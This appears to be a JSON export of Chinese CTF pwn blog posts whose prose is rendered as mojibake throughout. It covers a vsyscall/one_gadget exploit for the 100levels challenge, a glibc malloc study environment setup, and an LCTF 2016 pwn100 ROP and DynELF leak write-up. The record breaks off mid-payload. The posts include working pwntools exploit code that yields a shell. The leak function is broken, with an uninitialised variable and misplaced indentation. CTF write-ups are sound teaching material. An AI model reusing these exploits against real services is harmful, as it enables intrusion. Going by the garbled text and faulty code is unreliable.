2017-100levelsä¸€æ¨¡ä¸€æ ·ï¼Œåªä¸è¿‡æœ€å¤§å€¼å˜æˆäº†1000å…³ï¼Œæ‰€ä»¥è¿™é‡Œä¹ŸåŒæ ·å¯ä»¥ç”¨çˆ†ç ´æ¥åšï¼Œä½†æ˜¯å¯ä»¥ç”¨å¦ä¸€ç§æ–¹æ³•ï¼Œvsyscallã€‚\n\n2.è¿›å…¥IDAå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªhintå‡½æ•°ï¼Œè€Œä¸”é‡Œé¢æœ‰systemå‡½æ•°ï¼Œä½†æ˜¯å¾ˆå¥‡æ€ªï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsprintf((char *)&v1, \"Hint: %p\\n\", &system, &system);\n```\n\nè¿™ä¸ªä»£ç æ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œè¿˜æ˜¯çœ‹ä¸‹æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531418.jpeg)\n\nè¿™é‡Œå°±æ˜¯å°†systemçš„åœ°å€èµ‹å€¼ç»™raxï¼Œç„¶åraxç»™æ ˆä¸Šçš„[rbp+var_110]èµ‹å€¼ã€‚ä¹‹åä¹Ÿæ²¡æœ‰ä»€ä¹ˆå…¶å®ƒçš„æ›´æ”¹æ ˆä¸Š[rbp+var_110]çš„æ“ä½œï¼Œæ‰€ä»¥è¿›å…¥hintå‡½æ•°ä¹‹åï¼Œä¸€å®šä¼šå°†systemå‡½æ•°æ”¾åˆ°æ ˆä¸Šï¼Œé€šè¿‡è°ƒè¯•ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ã€‚\n\n3.ä¹‹åè¿›å…¥goå‡½æ•°ï¼Œå‘ç°å¦‚æœç¬¬ä¸€æ¬¡è¾“å…¥è´Ÿæ•°ï¼ŒåŸæœ¬å°†å…³å¡æ•°èµ‹å€¼ç»™[rbp+var_110]çš„æ“ä½œå°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œé‚£ä¹ˆ[rbp+var_110]ä¸Šä¿å­˜çš„ä»ç„¶æ˜¯systemå‡½æ•°çš„åœ°å€ã€‚ä¹‹åå†è¾“å…¥å…³å¡æ•°ï¼Œç›´æ¥åŠ åˆ°[rbp+var_110]ä¸Šï¼Œé‚£ä¹ˆå¦‚æœç¬¬ä¸€æ¬¡è¾“å…¥è´Ÿæ•°ï¼Œç¬¬äºŒæ¬¡è¾“å…¥systemå‡½æ•°å’Œone_gadgetçš„åç§»ï¼Œé‚£ä¹ˆå°±å˜ç›¸å°†[rbp+var_110]ä¸Šå­˜æ”¾çš„å†…å®¹ä¿å­˜ä¸ºone_gadgetçš„åœ°å€ã€‚\n\nâ–²è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ[rbp+var_110]æ˜¯åœ¨hintå‡½æ•°ä¸­è¢«èµ‹å€¼çš„ï¼Œè€Œgoå‡½æ•°ä¸­ç”¨åˆ°çš„ä¹Ÿæ˜¯[rbp+var_110]è¿™ä¸ªå˜é‡ï¼Œä½†æ˜¯ä¸åŒå‡½æ•°æ ˆè‚¯å®šæ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸¤ä¸ª[rbp+var_110]æ˜¯ä¸æ˜¯ä¸€æ ·çš„å°±å€¼å¾—æ€è€ƒä¸€ä¸‹ã€‚çœ‹ç¨‹åºå¯ä»¥å‘ç°ï¼Œhintå‡½æ•°å’Œgoå‡½æ•°éƒ½æ˜¯åœ¨mainå‡½æ•°ä¸­è°ƒç”¨çš„ï¼Œé‚£ä¹ˆå¦‚æœè°ƒç”¨çš„æ—¶å€™ä¸¤å¤„çš„rspæ˜¯ä¸€æ ·çš„å°±å¯ä»¥ä¿è¯ä¸¤ä¸ªå‡½æ•°çš„rbpä¸€æ ·ï¼Œä¹Ÿå°±ä»£ç [rbp+var_110]ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531579.jpeg)\n\nå¯ä»¥çœ‹åˆ°ä»è¯»å–é€‰é¡¹æ•°æ®ä¹‹åï¼Œåˆ°åˆ¤æ–­è¯­å¥ä¸€ç›´æ²¡æœ‰push,popä¹‹ç±»çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºæ— è®ºæ˜¯è¿è¡Œåˆ°hintå‡½æ•°è¿˜æ˜¯goå‡½æ•°æ—¶ï¼Œmainå‡½æ•°æ ˆçš„çŠ¶æ€éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä»è€Œå¯¼è‡´è¿›å…¥è¿™ä¸¤ä¸ªå‡½æ•°ä¸­çš„æ ˆåº•ä¹Ÿéƒ½æ˜¯åŒä¸€ä¸ªåœ°å€ï¼Œé‚£ä¹ˆ[rbp+var_110]ä¹Ÿå°±ä¸€æ ·ï¼Œæ‰€ä»¥ç”¨hintå‡½æ•°æ¥ä¸º[rbp+var_110]èµ‹å€¼æˆsystemå‡½æ•°ï¼Œå†ç”¨goå‡½æ•°æ¥ä¸º[rbp+var_110]èµ‹å€¼ä¸ºone_gadgetè¿™æ¡è·¯æ˜¯å¯ä»¥çš„ï¼ŒåŒæ ·å¯ä»¥è°ƒè¯•æ¥ç¡®å®šä¸€ä¸‹ã€‚\n\n4.é‚£ä¹ˆèµ‹å€¼ä¹‹åè¿›å…¥levelå…³å¡å‡½æ•°ï¼Œç”±äºé€’å½’å…³ç³»ï¼Œæœ€åä¸€å…³çš„æ ˆæ˜¯å’Œgoå‡½æ•°çš„æ ˆè¿åœ¨ä¸€èµ·çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æœ€åä¸€å…³çš„æ ˆæº¢å‡ºæŠµè¾¾goå‡½æ•°çš„æ ˆï¼Œä»è€ŒæŠµè¾¾[rbp+var_110]è¿™ä¸ªåœ°å€å¤„ã€‚\n\n5.ä½†æ˜¯æ ˆæº¢å‡ºåªèƒ½ä¿®æ”¹æ•°æ®ï¼Œå°±ç®—æ§åˆ¶eipï¼Œä½†æ˜¯ä¹Ÿå¹¶ä¸çŸ¥é“[rbp+var_110]å¤„çš„çœŸå®åœ°å€ï¼Œåªèƒ½é€šè¿‡è°ƒè¯•æ¥çŸ¥é“åç§»æ˜¯å¤šå°‘ã€‚æ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨çš„vsyscallæ¥å°†rspä¸‹æŒªåˆ°[rbp+var_110]å¤„ä»è€Œæ‰§è¡Œvsyscallçš„retæ“ä½œæ¥æ‰§è¡Œ[rbp+var_110]å¤„çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯one_gadgetã€‚\n\n6.è¿™é‡Œçœ‹ä¸€ä¸‹vsyscallå¤„çš„æ•°æ®ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191531595.png)\n\nâ–²vsyscallçš„ç‰¹ç‚¹ï¼š\n\n(1)æŸäº›ç‰ˆæœ¬å­˜åœ¨ï¼Œéœ€è¦ç”¨åˆ°gdbæ¥æŸ¥çœ‹ï¼ŒIDAä¸­é»˜è®¤ä¸å¯è§ã€‚\n\n(2)åœ°å€ä¸å—åˆ°ASLRå’ŒPIEçš„å½±å“ï¼Œå›ºå®šæ˜¯0xffffffffff600000-0xffffffffff601000ã€‚\n\n(3)ä¸èƒ½ä»ä¸­é—´è¿›å…¥ï¼Œåªèƒ½ä»å‡½æ•°å¼€å¤´è¿›å…¥ï¼Œæ„å‘³ç€ä¸èƒ½ç›´æ¥è°ƒç”¨é‡Œé¢çš„syscallã€‚è¿™é‡Œvsyscallåˆ†ä¸ºä¸‰ä¸ªå‡½æ•°ï¼Œä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ˜¯\n\nA.gettimeofday: 0xffffffffff600000\n\nB.time: 0xffffffffff600400\n\nC.getcpu: 0xffffffffff600800\n\n(4)gettimeofdayå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶è¿”å›å€¼å°±æ˜¯0ï¼Œä¿å­˜åœ¨raxå¯„å­˜å™¨ä¸­ã€‚è¿™å°±ä¸ºæŸäº›one_gadgetåˆ›é€ äº†æ¡ä»¶ã€‚\n\n7.è§‚å¯Ÿä»£ç å¯ä»¥å‘ç°ï¼Œä¸‰ä¸ªå‡½æ•°æ‰§è¡ŒæˆåŠŸä¹‹åç›¸å½“äºä¸€ä¸ªretæ“ä½œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†gettimeofdayæ”¾åœ¨eipå¤„ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæ”¾äº†ä¸€ä¸ªretæ“ä½œä¸Šå»ï¼Œè€Œretæ“ä½œåˆç›¸å½“äºpop  eipï¼Œé‚£ä¹ˆå°±ç›¸å½“äºç›´æ¥å°†rspå¾€ä¸‹æ‹‰äº†ä¸€ä¸ªå•ä½ã€‚å¦‚æœæˆ‘ä»¬å¤šæ¬¡è°ƒç”¨gettimeofdayï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†rspä¸‹æ‹‰å¤šä¸ªå•ä½ï¼Œä»è€ŒæŠµè¾¾æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹æ¥æ‰§è¡Œä»£ç ã€‚é‚£ä¹ˆè¿™é‡Œå°±å¯ä»¥å°†eipæ”¹æˆgettimeofdayï¼Œç„¶ååœ¨ä¹‹åæ·»åŠ å¤šä¸ªgettimeofdayæ¥æ»‘åˆ°one_gadgetæ¥æ‰§è¡Œä»£ç ã€‚\n\n8.æ‰€ä»¥ç°åœ¨å°±å¯ä»¥ç¼–å†™expäº†\n\n(1)å‰ç½®å†…å®¹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nlibc_system_offset = 0x432C0\t\t\t\t\t\n#å‡å»systemå‡½æ•°ç¦»libcå¼€å¤´çš„åç§»\none_gadget_offset = 0x43158\t\t\t\t\n#åŠ ä¸Šone gadget rceç¦»libcå¼€å¤´çš„åç§»\nvsyscall_gettimeofday = 0xffffffffff600000\n\nio.recvuntil('Choice:')\nio.sendline('2') #è®©systemçš„åœ°å€è¿›å…¥æ ˆä¸­\nio.recvuntil('Choice:')\nio.sendline('1') #è°ƒç”¨go()\nio.recvuntil('How many levels?')\nio.sendline('-1') #è¾“å…¥çš„å€¼å¿…é¡»å°äº0ï¼Œé˜²æ­¢è¦†ç›–æ‰systemçš„åœ°å€\nio.recvuntil('Any more?')\nio.sendline(str(one_gadget_offset-libc_system_offset))\t\t\n#ç¬¬äºŒæ¬¡è¾“å…¥å…³å¡çš„æ—¶å€™è¾“å…¥åç§»å€¼ï¼Œä»è€Œé€šè¿‡ç›¸åŠ å°†systemçš„åœ°å€å˜ä¸ºone gadget rceçš„åœ°å€\n```\n\nè¿™é‡Œç”±äºç›¸åŠ å…³ç³»ï¼Œlevels=system_addr + one_gadget_offset - libc_system_offset,è‚¯å®šè¶…è¿‡999ï¼Œæ‰€ä»¥å…³å¡æ•°ä¸€å®šæ˜¯1000å…³ã€‚\n\n(2)å¼€å§‹å¾ªç¯ç­”é¢˜ï¼Œç›´è‡³åˆ°è¾¾æœ€åä¸€å…³æ‰§è¡Œæ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndef answer():\n    io.recvuntil('Question: ') \n    answer = eval(io.recvuntil(' = ')[:-3])\n    io.recvuntil('Answer:')\n    io.sendline(str(answer))\nfor i in range(999): #å¾ªç¯ç­”é¢˜\n    log.info(i)\n    answer()\n```\n\n(3)æœ€åä¸€å…³æ‰§è¡Œæ ˆæº¢å‡ºï¼Œåˆ©ç”¨gettimeofdayæ»‘è‡³one_gadegtä»è€Œgetshellã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nio.recvuntil('Question: ')\nio.send(b'a'*0x38 + p64(vsyscall_gettimeofday)*3)\nio.interactive()\n```\n\nâ–²ä»¥ä¸‹æ˜¯æµ‹è¯•[rbp+var_110]çš„æ•°æ®ï¼š\n\nmainå‡½æ•°ä¸­çš„rbp:  00007FFD3A854900\n\nhintå‡½æ•°ä¸­çš„rbp:   00007FFD3A8548C0\n\ngoå‡½æ•°ä¸­çš„rbp:    00007FFD3A8548C0\n\nâ–²vsyscallç”¨æ³•:\n\nvsyscallç›´æ¥è¿›è¡Œsyscallï¼Œå¹¶æ²¡æœ‰åˆ©ç”¨æ ˆç©ºé—´ï¼Œæ‰€ä»¥åœ¨å¤„ç†æ ˆæº¢å‡ºï¼Œä½†æ˜¯ç”±äºPIEæ²¡æœ‰åˆ«çš„åœ°å€å¯ä»¥ç”¨æ—¶ï¼Œè€Œæ ˆä¸Šåˆæœ‰æŸä¸ªæœ‰ç”¨çš„åœ°å€çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡vsyscallæ„é€ ä¸€ä¸ªropé“¾æ¥retï¼Œæ¯æ¬¡retéƒ½ä¼šæ¶ˆè€—æ‰ä¸€ä¸ªåœ°å€ï¼Œå°†rspä¸‹æ‹‰ä¸€ä¸ªå•ä½ï¼Œè¿™æ ·å°±å¯ä»¥é€æ¸å»è´´è¿‘æƒ³è¦çš„é‚£ä¸ªåœ°å€ï¼Œæœ€åæˆåŠŸretåˆ°ç›¸åº”çš„ä½ç½®ã€‚\n\nâ–²vdsoçš„ç‰¹ç‚¹ï¼š\n\n(1)vdsoçš„åœ°å€éšæœºåŒ–çš„ï¼Œä¸”å…¶ä¸­çš„æŒ‡ä»¤å¯ä»¥ä»»æ„æ‰§è¡Œï¼Œä¸éœ€è¦ä»å…¥å£å¼€å§‹ã€‚\n\n(2)ç›¸æ¯”äºæ ˆå’Œå…¶ä»–çš„ASLRï¼Œvdsoçš„éšæœºåŒ–éå¸¸çš„å¼±ï¼Œå¯¹äº32çš„ç³»ç»Ÿæ¥è¯´ï¼Œæœ‰1/256çš„æ¦‚ç‡å‘½ä¸­ã€‚\n\n(3)ä¸åŒçš„å†…æ ¸éšæœºç¨‹åº¦ä¸åŒï¼š\n\nA.è¾ƒæ—§ç‰ˆæœ¬ï¼š`0xf76d9000`-`0xf77ce000`\n\nB.è¾ƒæ–°ç‰ˆæœ¬ï¼š`0xf7ed0000`-`0xf7fd0000`\n\nC.å…¶å®ƒç‰ˆæœ¬ï¼š\n\nå¯ä»¥ç¼–è¯‘ä»¥ä¸‹æ–‡ä»¶ä¹‹åç”¨è„šæœ¬æŸ¥çœ‹ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n// compiled: gcc -g -m32 vdso_addr.c -o vdso_addr\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main()\n{\n    printf(\"vdso addr: %124$p\\n\");//è¿™é‡Œçš„åç§»ä¸åŒå†…æ ¸ä¸ä¸€æ ·ï¼Œå¯è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ã€‚\n    return 0;\n}\n```\n\næŸ¥çœ‹è„šæœ¬ï¼š\n\n\\#æ³¨é‡Šå¤´\n\n```\n#!/usr/bin/python\n# -*- coding:utf-8 -*-\n\nimport os\n\nresult = []\nfor i in range(100):\n    result += [os.popen('./vdso_addr').read()[:-1]]\n\nresult = sorted(result)\n\nfor v in result:\n    print (v)\n```\n\nâ–²vdsoçš„ç”¨æ³•ï¼šä¸vsystemç±»ä¼¼ï¼Œæ³„éœ²å‡ºåœ°å€åç›¸å½“äºæœ‰äº†syscallã€‚å¦å¤–32ä½æ¡ä»¶ä¸‹æœ‰__kernel_rt_sigreturnï¼Œå¯ä»¥æ‰“SROPã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://xz.aliyun.com/t/5236\n\n \n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"Learn_malloc.c_before","url":"/2021/08/14/Learn_malloc.c_before/","content":"\nä¸€ã€ç¯å¢ƒéƒ¨ç½²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ndocker pull ubuntu:16.04\ndocker pull ubuntu:18.04\ndocker pull ubuntu:20.04\n```\n\näºŒã€ç¯å¢ƒå®‰è£…:\n\n1.aptæ¢æºï¼Œdockeræ¢æºï¼Œpipæ¢æºã€‚\n\n2.å®‰è£…å‰ç½®åŒ…ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nsudo apt-get install libxml2-dev\nsudo apt-get install libxslt-dev\nsudo apt-get install libmysqlclient-dev\nsudo apt-get install libsqlite3-dev\nsudo apt-get install zlib1g-dev\nsudo apt-get install python-dev\nsudo apt-get install libffi-dev\nsudo apt-get install libssl-dev\n```\n\n3.å®‰è£…pythonå¥½å¤šæ­¥éƒ¨æ›²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nwget https://www.python.org/ftp/python/2.7.9/Python-2.7.9.tgz\n(wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz)\ntar -zxvf Python-2.7.9.tgz\ncd Python-2.7.9\n./configure --prefix=/usr/local/python27\nmake\nmake install\nln -s /usr/local/python27/bin/python /usr/bin/python2\n```\n\n4.å®‰è£…setuptoolså››éƒ¨æ›²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nwget https://pypi.python.org/packages/45/29/8814bf414e7cd1031e1a3c8a4169218376e284ea2553cc0822a6ea1c2d78/setuptools-36.6.0.zip#md5=74663b15117d9a2cc5295d76011e6fd1\nunzip setuptools-36.6.0.zip\ncd setuptools-36.6.0\npython2 setup.py install\n```\n\n5.å®‰è£…pipå››éƒ¨æ›²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nwget https://pypi.python.org/packages/11/b6/abcb525026a4be042b486df43905d6893fb04f05aac21c32c638e939e447/pip-9.0.1.tar.gz#md5=35f01da33009719497f01a4ba69d63c9\ntar -zxvf pip-9.0.1.tar.gz\ncd pip-9.0.1\npython2 setup.py install\nln -s /usr/local/python27/bin/pip2.7 /usr/bin/pip2\n```\n\n6.å®‰è£…pwndbgä¸‰éƒ¨æ›²:\n\n```\n#æ³¨é‡Šå¤´\n\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\n./setup.sh\n```\n\n7.æ·»åŠ pwngdb:\n\n```\n#æ³¨é‡Šå¤´\n\ncd ~\ngit clone https://github.com/0xKira/pwngdb.git\nvim ~/.gdbinit\n#å°†pedaæ³¨é‡Šï¼Œæ·»åŠ ï¼š(å¿…é¡»åŠ åœ¨ç¬¬ä¸€è¡Œ)\nsource ~/pwndbg/gdbinit.py\n```\n\n8.å®‰è£…pwntoolsä¸€æ­¥æ›²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npip2 install pwntools\npip3 install pwntools\n```\n\nä¸‰ã€å‡†å¤‡æºç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nhttp://ftp.gnu.org/gnu/glibc/\n```\n\næŒ‚é£æœºä¸‹gzåŒ…è€å¿«äº†ï¼Œæ‰¾åˆ°é‡Œé¢çš„malloc.cå‡†å¤‡å¼€å§‹é˜…è¯»ã€‚\n\nå››ã€è·Ÿç€CTFwikiä¸€æ­¥æ­¥è°ƒè¯•ï¼š\n\nhttps://wiki.x10sec.org/pwn/linux/glibc-heap/chunk_extend_overlapping-zh/\n\näº”ã€è§†é¢‘è°ƒè¯•ï¼š\n\nhttps://www.bilibili.com/video/BV1q5411h7Wf\n\n \n\n \n\n \n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN"]},{"title":"LCTF 2016-pwn100_without_libc","url":"/2021/08/14/LCTF 2016-pwn100_without_libc/","content":"\n1.ä¸ä¹‹å‰åšçš„pwn100ä¸€æ¨¡ä¸€æ ·ï¼Œåªæ˜¯ä¹‹å‰æœ‰ç»™Libcï¼Œè¿™æ¬¡æ²¡ç»™Libcã€‚æ ˆæº¢å‡ºï¼Œé€‰æ‹©ç”¨Putså‡½æ•°æ¥æ³„éœ²åœ°å€ä»è€Œå†æ‰§è¡Œæ ˆæº¢å‡ºæ¥é‡å¤ä½¿ç”¨ã€‚\n\n2.ç¼–å†™leakå‡½æ•°ï¼Œç”±äºç”¨Putså‡½æ•°æ‰“å°ï¼Œæ‰€ä»¥éœ€è¦æœ‰ä¸ªå¾ªç¯æ¡ä»¶ï¼Œå…·ä½“åŸå› å¯ä»¥æŸ¥çœ‹ä¹‹å‰å†™çš„ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\ndef leak(addr):\n    count = 0\n    up = ''\n    content = ''\n    payload = 'A'*72 #padding\n    payload += p64(pop_rdi) #ç»™puts()èµ‹å€¼\n    payload += p64(addr) #leakå‡½æ•°çš„å‚æ•°addr\n    payload += p64(puts_addr) #è°ƒç”¨puts()å‡½æ•°\n    payload += p64(start_addr) #è·³è½¬åˆ°startï¼Œæ¢å¤æ ˆ\n    payload = payload.ljust(200, 'B') #padding\n    io.send(payload)\n    io.recvuntil(\"bye~\\n\")\n    while True: #æ— é™å¾ªç¯è¯»å–ï¼Œé˜²æ­¢recv()è¯»å–è¾“å‡ºä¸å…¨\n        c = io.recv(numb=1, timeout=0.1) #æ¯æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œè®¾ç½®è¶…æ—¶æ—¶é—´ç¡®ä¿æ²¡æœ‰é—æ¼\n        count += 1\n        if up == '\\n' and c == \"\": #ä¸Šä¸€ä¸ªå­—ç¬¦æ˜¯å›è½¦ä¸”è¯»ä¸åˆ°å…¶ä»–å­—ç¬¦ï¼Œè¯´æ˜è¯»å®Œäº†\n            data = data[:-1]+'\\x00' #æœ€åä¸€ä¸ªå­—ç¬¦ç½®ä¸º\\x00\n            break\n        else:\n            data += c #æ‹¼æ¥è¾“å‡º\n            up = c #ä¿å­˜æœ€åä¸€ä¸ªå­—ç¬¦\n    data = data[:4] #æˆªå–è¾“å‡ºçš„ä¸€æ®µä½œä¸ºè¿”å›å€¼ï¼Œæä¾›ç»™DynELFå¤„ç†\nlog.info(\"%#x => %s\" % (addr, (data or '').encode('hex')))\nreturn data\n```\n\n3.å¾—åˆ°system_addrçš„åœ°å€åï¼Œåç»­çš„æ“ä½œç”¨ä¸‡èƒ½gadgetå’Œreadå‡½æ•°å³å¯å®ç°ã€‚å¦‚æœè¿˜éœ€è¦å…¶å®ƒåœ°å€ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ­¤æ–¹æ³•æ¥æ‰“å°ï¼Œä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚\n\n(å‚ç…§ä¹‹å‰ä¸ç»™Libcçš„pwn100)\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"LCTF 2016-pwn100","url":"/2021/08/14/LCTF 2016-pwn100/","content":"\n \n\n1.å¸¸è§„checksecï¼Œå¼€äº†NXä¿æŠ¤ã€‚æ‰“å¼€IDAï¼Œæ‰¾æ¼æ´ï¼Œé€æ¬¡è¿›å…¥åï¼Œsub_40068E()å‡½æ•°ä¸­çš„sub_40063Då‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n\nchar v1; // [rsp+0h] [rbp-40h]\n---------------------------------------------\nsub_40063D((__int64)&v1, 200);\n--------------------------------------------------------------------\nfor ( i = 0; ; ++i )\n{\n    result = i;\n    if ( (signed int)i >= a2 )\n      break;\n    read(0, (void *)((signed int)i + a1), 1uLL);\n}\n```\n\nè¿™é‡Œä¼ çš„æ˜¯å±€éƒ¨å˜é‡v1çš„åœ°å€ï¼Œæ‰€ä»¥è¿›å…¥sub_40063Dåï¼Œä¿®æ”¹a1æŒ‡é’ˆå¯¹åº”çš„å†…å­˜çš„å€¼å…¶å®å°±æ˜¯ä¿®æ”¹ä¹‹å‰å±€éƒ¨å˜é‡v1çš„å€¼ï¼Œå°±æ˜¯ä¼ æŒ‡é’ˆã€‚è¿™ä¸ªå‡½æ•°æ¯æ¬¡è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œç›´åˆ°è¯»å–æ»¡200å­—èŠ‚ï¼Œå…¶å®å°±å¯ä»¥ç›´æ¥æŠŠå®ƒå½“æˆread(v1,200)å®Œäº‹ã€‚\n\n(é¢˜å¤–è¯ï¼šæ±‡ç¼–ä»£ç ä¸­å½“å±€éƒ¨å˜é‡ä¼ å‚æ—¶ï¼Œéœ€è¦ç”¨åˆ°leaï¼Œå³ï¼šlea   rax, [rbp+var_40]ï¼Œå°±æ˜¯å°†æ ˆä¸Šçš„å˜é‡var_40çš„åœ°å€ç»™raxï¼Œç„¶åä¼ å‚mov   rdi, raxï¼›åˆ©ç”¨rdiæ¥ä¼ å‡½æ•°å‚æ•°ã€‚è¿›å…¥åˆ°å‡½æ•°å†…éƒ¨åå°±ä¼šæœ‰ï¼šmov   [rbp+var_18], rdiï¼Œä¹Ÿå°±æ˜¯åœ¨è¯¥å‡½æ•°æ ˆä¸Šåˆ›å»ºä¸€ä¸ªå±€éƒ¨å˜é‡æ¥ä¿å­˜ä¼ å…¥å˜é‡çš„æ ˆä¸Šçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰var_40çš„æ ˆä¸Šåœ°å€ï¼Œä¿å­˜åœ¨[rbp+var_18]è¿™ä¸ªå±€éƒ¨å˜é‡ä¸­ã€‚è¿™æ˜¯è¿™ä¸ªç¨‹åºä¸­ï¼Œä¸åŒç¨‹åºå¯èƒ½ä¸å¤ªä¸€æ ·ã€‚)\n\n2.æ‰€ä»¥è¿™ä¸ªæ ˆæº¢å‡ºçš„è¦†ç›–è¿”å›åœ°å€åº”è¯¥æ˜¯sub_40068Eå‡½æ•°çš„è¿”å›åœ°å€ï¼Œç®€å•è¿œç¨‹è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹v1æ‰€åœ¨æ ˆåœ°å€å’Œrbpä¸‹ä¸€åœ°å€çš„è·ç¦»å°±æ˜¯åç§»é‡ï¼Œä¸º0x48ï¼Œçœ‹æ±‡ç¼–è®¡ç®—å°±å¯ä»¥å¾—åˆ°0x40+0x8ã€‚\n\n3.ç°åœ¨éœ€è¦systemå’Œbinshï¼Œè¿™ä¸ªç¨‹åºä¸­è¿™ä¸¤ä¸ªéƒ½æ²¡æœ‰å¸¦ï¼Œè€Œåªæœ‰Libcä¸­æ‰æœ‰ï¼Œä½†æ˜¯è¿™ä¸ªç¨‹åºå¹¶æ²¡æœ‰æ³„éœ²Libcçš„åœ°å€ã€‚åˆ†æç¨‹åºå‘ç°ï¼Œç¨‹åºä¸­.pltæ®µä¸­å¯¼å…¥äº†putså‡½æ•°ï¼ŒIDAä¸­å‡½æ•°åé‚£ä¸€å—å¯ä»¥çœ‹åˆ°ï¼šæ‰€ä»¥å¯ä»¥ç”¨pwntoolsä¸­çš„DynELFï¼Œè°ƒç”¨è¯¥putså‡½æ•°ï¼Œä»è€Œæ³„éœ²å‡ºlibcä¸­putsæˆ–è€…readçš„åœ°å€ã€‚ç”±äºå¤§å¤šæ•™ç¨‹é€‰æ‹©æ³„éœ²readï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹©æ³„éœ²putså‡½æ•°åœ¨Libcä¸­çš„è¢«åŠ è½½çš„åœ°å€ã€‚è¿™é‡Œç”¨read,setbuf,ç”šè‡³__libc_start_mainå‡½æ•°ä¹Ÿéƒ½å¯ä»¥ï¼Œå› ä¸ºéƒ½å¯¼å…¥äº†pltè¡¨å’Œå¤–éƒ¨å¼•ç”¨äº†ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552597.png)\n\n4.å¼€å§‹æ„é€ æ³„éœ²åœ°å€çš„ç¬¬ä¸€æ®µpayload:\n\n```\n#æ³¨é‡Šå¤´\n\npayload = \"A\"*72            #padding\npayload += p64(pop_rdi)      \n#ç”±äºéœ€è¦å‘putsä¼ å‚ï¼Œæ‰€ä»¥ç”¨åˆ°è¯¥åœ°å€ï¼Œå¯ä»¥ä½¿ç”¨ropgadget\n#æŸ¥è¯¢ROPgadget --binary pwn100 | grep \"pop rdi ; ret\"\n#æˆ–è€…åœ¨ä¸‡èƒ½gadgetä¸­çš„pop r15ï¼Œç”¨Då‘½ä»¤è½¬æ¢æˆæ•°æ®åå†Cå‘½ä»¤è½¬æ¢å›ä»£ç å¯ä»¥çœ‹åˆ°\npayload += p64(puts_got)\n#è¿™æ˜¯putsåœ¨.gotè¡¨(.got.pltæ®µ)ä¸­çš„åœ°å€ï¼Œæ˜¯ä¼ é€’ç»™Putså‡½æ•°çš„å‚æ•°ï¼Œå½“è¯¥åº“å‡½æ•°è¢«åŠ è½½è¿›å…¥libcä¸­\n#æ—¶ï¼Œè¿™æ ·ä¼ å‚è¿›å»å†æ‰“å°å°±å¯ä»¥æ‰“å°å‡ºputså‡½æ•°åœ¨libcä¸­çš„åœ°å€ï¼Œä¹Ÿå°±æ³„éœ²å‡ºæ¥äº†ã€‚\npayload += p64(puts_addr)\n#è¿™æ˜¯è°ƒç”¨putså‡½æ•°ï¼Œelf.plt['puts']ï¼ˆ.pltæ®µï¼‰\npayload += p64(start_addr)\n#æ•´ä¸ªç¨‹åºçš„èµ·å§‹ä»£ç æ®µï¼Œç”¨ä»¥æ¢å¤æ ˆã€‚è¿™ä¸ªå‡½æ•°ä¸­ä¼šè°ƒç”¨mainå‡½æ•°ã€‚è¿™é‡Œç”¨Mianå‡½æ•°åœ°#å€ä¹Ÿå¯ä»¥\npayload = payload.ljust(200, 